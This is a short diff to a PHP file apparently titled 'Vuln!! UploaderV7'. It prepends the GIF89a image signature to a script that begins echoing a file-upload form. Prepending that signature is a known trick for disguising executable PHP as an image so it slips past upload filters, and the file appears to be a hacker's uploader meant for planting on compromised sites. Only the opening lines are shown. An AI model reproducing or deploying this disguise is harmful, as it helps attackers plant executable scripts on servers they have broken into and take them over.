@@ -1,3 +1,4 @@
+GIF89a
 <title>Vuln!! UploaderV7</title>
 <?php
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
